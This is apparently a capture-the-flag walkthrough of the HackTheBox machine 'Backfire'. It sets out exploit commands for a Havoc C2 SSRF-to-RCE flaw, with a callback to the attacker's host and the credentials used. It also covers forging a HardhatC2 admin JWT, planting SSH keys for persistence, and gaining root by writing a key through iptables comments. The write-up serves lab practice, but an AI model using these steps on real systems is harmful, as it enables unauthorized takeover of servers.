## Initial Reconnaissance

### Port Enumeration

Investigating port `8000` revealed two interesting files:

* `havoc.yaotl`
* `disable_tls.patch`

These files appeared to be related to a Havoc C2 listener.

Inspecting `havoc.yaotl` uncovered credentials for users `ilya` and `sergej`. Despite obtaining these credentials, I was initially unable to access SSH.

## Exploitation via CVE-2024-41570 (Havoc C2 SSRF to RCE)

I realized there might be an SSRF to RCE vulnerability exploitable via Havoc C2. Leveraging CVE-2024-41570, I used the previously obtained credentials to exploit the server:

```bash
python3 exploit.py -t https://backfire.htb -i 127.0.0.1 -p 40056 -U 'ilya' -P 'CobaltStr1keSuckz!' -l 10.10.16.37 -L 3001
```

This successfully granted me shell access as the user `ilya`. However, the shell was unstable and frequently disconnected.

To ensure a stable connection, I decided to generate an SSH key pair and authorize it for user `ilya`:

```bash
ssh-keygen
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

After this, I was able to log in reliably via SSH:

```bash
ssh ilya@backfire.htb -i ~/.ssh/id_rsa
```

## Lateral Movement via HardhatC2

While enumerating accessible ports and files, I noticed evidence indicating user `sergej` was running a HardhatC2 server. I suspected this might be leveraged for lateral movement.

To interact with HardhatC2, I performed SSH port forwarding:

```bash
ssh -L 7096:localhost:7096 -L 5000:localhost:5000 -L 40056:localhost:40056 ilya@backfire.htb -i ~/.ssh/id_rsa
```

Port `7096` was identified as the login panel for HardhatC2.

### Exploiting HardhatC2 via JWT Vulnerability

I found an article detailing how static JWT keys in HardhatC2 could be exploited to create an administrator account:

* Reference: [HardhatC2 0-days RCE & Auth Bypass](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7)

Following the provided script, I successfully forged an admin JWT and gained access to the HardhatC2 administrative interface. From there, I executed commands using the terminal functionality in the implants section.

Again, I added my SSH key for stable access, this time for user `sergej`.

## Privilege Escalation to Root

Checking `sergej`'s privileges revealed the ability to execute SUID binaries `iptables` and `iptables-save` as root. Given this capability, I attempted to escalate privileges by injecting my SSH key using iptables comments and saving these rules directly into the root’s authorized SSH keys.

Initially, overwriting `/etc/passwd` and `/etc/passwd.bak` wasn't effective because a cron job reverted changes. Instead, I focused on injecting an SSH key directly:

```bash
sudo /usr/sbin/iptables -A INPUT -i lo -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAkuGVr+yFcYjNBCeizGyvCbi7x0vBFoVO7sjqhy0SXl gg@pop-os\n' -j ACCEPT
sudo iptables-save -f /root/.ssh/authorized_keys
```

This successfully injected my SSH key into the root user's authorized keys file.

### Accessing Root via SSH

With my key injected, I logged in as root:

```bash
ssh root@backfire.htb -i ~/.ssh/id_ed25519
```

Now with full access, I verified the privilege escalation was successful:

```bash
root@backfire:~# ls
a.txt  root.txt
```

This concluded my successful compromise and privilege escalation of the target.
